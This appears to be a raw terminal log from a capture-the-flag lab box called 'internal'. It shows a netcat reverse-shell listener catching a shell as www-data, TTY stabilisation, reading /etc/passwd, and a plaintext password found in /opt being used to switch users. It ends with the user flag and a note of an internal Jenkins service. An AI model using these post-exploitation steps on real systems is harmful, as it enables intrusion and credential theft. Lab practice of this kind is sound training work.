
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443                                         
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.115.97] 36272
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:20:46 up  2:26,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can´t access tty; job control turned off
$ ls -la
total 1847400
drwxr-xr-x  24 root root       4096 Aug  3  2020 .
drwxr-xr-x  24 root root       4096 Aug  3  2020 ..
drwxr-xr-x   2 root root       4096 Aug  3  2020 bin
drwxr-xr-x   4 root root       4096 Aug  3  2020 boot
drwxr-xr-x   2 root root       4096 Aug  3  2020 cdrom
drwxr-xr-x  18 root root       3760 Jul 30 11:54 dev
drwxr-xr-x 102 root root       4096 Aug  3  2020 etc
drwxr-xr-x   3 root root       4096 Aug  3  2020 home
lrwxrwxrwx   1 root root         34 Aug  3  2020 initrd.img -> boot/initrd.img-4.15.0-112-generic
lrwxrwxrwx   1 root root         34 Aug  3  2020 initrd.img.old -> boot/initrd.img-4.15.0-112-generic
drwxr-xr-x  23 root root       4096 Aug  3  2020 lib
drwxr-xr-x   2 root root       4096 Aug  3  2020 lib64
drwx------   2 root root      16384 Aug  3  2020 lost+found
drwxr-xr-x   2 root root       4096 Feb  3  2020 media
drwxr-xr-x   2 root root       4096 Feb  3  2020 mnt
drwxr-xr-x   3 root root       4096 Aug  3  2020 opt
dr-xr-xr-x 118 root root          0 Jul 30 11:54 proc
drwx------   7 root root       4096 Aug  3  2020 root
drwxr-xr-x  30 root root       1000 Jul 30 11:57 run
drwxr-xr-x   2 root root      12288 Aug  3  2020 sbin
drwxr-xr-x   4 root root       4096 Aug  3  2020 snap
drwxr-xr-x   2 root root       4096 Feb  3  2020 srv
-rw-------   1 root root 1891631104 Aug  3  2020 swap.img
dr-xr-xr-x  13 root root          0 Jul 30 11:54 sys
drwxrwxrwt   2 root root       4096 Jul 30 14:16 tmp
drwxr-xr-x  10 root root       4096 Feb  3  2020 usr
drwxr-xr-x  14 root root       4096 Aug  3  2020 var
lrwxrwxrwx   1 root root         31 Aug  3  2020 vmlinuz -> boot/vmlinuz-4.15.0-112-generic
lrwxrwxrwx   1 root root         31 Aug  3  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-112-generic
$ cd home
$ ls -la
total 12
drwxr-xr-x  3 root      root      4096 Aug  3  2020 .
drwxr-xr-x 24 root      root      4096 Aug  3  2020 ..
drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
$ ls -la
total 12
drwxr-xr-x  3 root      root      4096 Aug  3  2020 .
drwxr-xr-x 24 root      root      4096 Aug  3  2020 ..
drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@internal:/home$ ^Z
zsh: suspended  nc -lvnp 443
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg  
[1]  + continued  nc -lvnp 443

www-data@internal:/home$ export TERM=xterm
www-data@internal:/home$ ls -la
total 12
drwxr-xr-x  3 root      root      4096 Aug  3  2020 .
drwxr-xr-x 24 root      root      4096 Aug  3  2020 ..
drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
www-data@internal:/home$ su aubreanna
Password: 
su: Authentication failure
www-data@internal:/home$ su aubreanna
Password: 
su: Authentication failure
www-data@internal:/home$ su aubreanna
Password: 
su: Authentication failure
www-data@internal:/home$ su aubreanna
Password: 
su: Authentication failure
www-data@internal:/home$ ls -la
total 12
drwxr-xr-x  3 root      root      4096 Aug  3  2020 .
drwxr-xr-x 24 root      root      4096 Aug  3  2020 ..
drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna
www-data@internal:/home$ cd ..
www-data@internal:/$ ls -la
total 1847400
drwxr-xr-x  24 root root       4096 Aug  3  2020 .
drwxr-xr-x  24 root root       4096 Aug  3  2020 ..
drwxr-xr-x   2 root root       4096 Aug  3  2020 bin
drwxr-xr-x   4 root root       4096 Aug  3  2020 boot
drwxr-xr-x   2 root root       4096 Aug  3  2020 cdrom
drwxr-xr-x  18 root root       3760 Jul 30 11:54 dev
drwxr-xr-x 102 root root       4096 Aug  3  2020 etc
drwxr-xr-x   3 root root       4096 Aug  3  2020 home
lrwxrwxrwx   1 root root         34 Aug  3  2020 initrd.img -> boot/initrd.img-4.15.0-112-generic
lrwxrwxrwx   1 root root         34 Aug  3  2020 initrd.img.old -> boot/initrd.img-4.15.0-112-generic
drwxr-xr-x  23 root root       4096 Aug  3  2020 lib
drwxr-xr-x   2 root root       4096 Aug  3  2020 lib64
drwx------   2 root root      16384 Aug  3  2020 lost+found
drwxr-xr-x   2 root root       4096 Feb  3  2020 media
drwxr-xr-x   2 root root       4096 Feb  3  2020 mnt
drwxr-xr-x   3 root root       4096 Aug  3  2020 opt
dr-xr-xr-x 120 root root          0 Jul 30 11:54 proc
drwx------   7 root root       4096 Aug  3  2020 root
drwxr-xr-x  30 root root       1000 Jul 30 11:57 run
drwxr-xr-x   2 root root      12288 Aug  3  2020 sbin
drwxr-xr-x   4 root root       4096 Aug  3  2020 snap
drwxr-xr-x   2 root root       4096 Feb  3  2020 srv
-rw-------   1 root root 1891631104 Aug  3  2020 swap.img
dr-xr-xr-x  13 root root          0 Jul 30 14:40 sys
drwxrwxrwt   2 root root       4096 Jul 30 14:16 tmp
drwxr-xr-x  10 root root       4096 Feb  3  2020 usr
drwxr-xr-x  14 root root       4096 Aug  3  2020 var
lrwxrwxrwx   1 root root         31 Aug  3  2020 vmlinuz -> boot/vmlinuz-4.15.0-112-generic
lrwxrwxrwx   1 root root         31 Aug  3  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-112-generic
www-data@internal:/$ cd opt
www-data@internal:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
drwx--x--x  4 root root 4096 Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
www-data@internal:/opt$ su aubreanna 
Password: 
aubreanna@internal:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
drwx--x--x  4 root root 4096 Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
aubreanna@internal:/opt$ cd containerd/
aubreanna@internal:/opt/containerd$ ls -la
ls: cannot open directory '.': Permission denied
aubreanna@internal:/opt/containerd$ cd ..
aubreanna@internal:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
drwx--x--x  4 root root 4096 Aug  3  2020 containerd
-rw-r--r--  1 root root  138 Aug  3  2020 wp-save.txt
aubreanna@internal:/opt$ cd ..
aubreanna@internal:/$ ls -la
total 1847400
drwxr-xr-x  24 root root       4096 Aug  3  2020 .
drwxr-xr-x  24 root root       4096 Aug  3  2020 ..
drwxr-xr-x   2 root root       4096 Aug  3  2020 bin
drwxr-xr-x   4 root root       4096 Aug  3  2020 boot
drwxr-xr-x   2 root root       4096 Aug  3  2020 cdrom
drwxr-xr-x  18 root root       3760 Jul 30 11:54 dev
drwxr-xr-x 102 root root       4096 Aug  3  2020 etc
drwxr-xr-x   3 root root       4096 Aug  3  2020 home
lrwxrwxrwx   1 root root         34 Aug  3  2020 initrd.img -> boot/initrd.img-4.15.0-112-generic
lrwxrwxrwx   1 root root         34 Aug  3  2020 initrd.img.old -> boot/initrd.img-4.15.0-112-generic
drwxr-xr-x  23 root root       4096 Aug  3  2020 lib
drwxr-xr-x   2 root root       4096 Aug  3  2020 lib64
drwx------   2 root root      16384 Aug  3  2020 lost+found
drwxr-xr-x   2 root root       4096 Feb  3  2020 media
drwxr-xr-x   2 root root       4096 Feb  3  2020 mnt
drwxr-xr-x   3 root root       4096 Aug  3  2020 opt
dr-xr-xr-x 124 root root          0 Jul 30 11:54 proc
drwx------   7 root root       4096 Aug  3  2020 root
drwxr-xr-x  30 root root       1000 Jul 30 11:57 run
drwxr-xr-x   2 root root      12288 Aug  3  2020 sbin
drwxr-xr-x   4 root root       4096 Aug  3  2020 snap
drwxr-xr-x   2 root root       4096 Feb  3  2020 srv
-rw-------   1 root root 1891631104 Aug  3  2020 swap.img
dr-xr-xr-x  13 root root          0 Jul 30 14:40 sys
drwxrwxrwt   2 root root       4096 Jul 30 14:52 tmp
drwxr-xr-x  10 root root       4096 Feb  3  2020 usr
drwxr-xr-x  14 root root       4096 Aug  3  2020 var
lrwxrwxrwx   1 root root         31 Aug  3  2020 vmlinuz -> boot/vmlinuz-4.15.0-112-generic
lrwxrwxrwx   1 root root         31 Aug  3  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-112-generic
aubreanna@internal:/$ cd home
aubreanna@internal:/home$ cd aubreanna
aubreanna@internal:~$ ls -la
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .local
-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
aubreanna@internal:~$ ls -la
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .local
-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

aubreanna:bubb13guM!@#123

Internal Jenkins service is running on 172.17.0.2:8080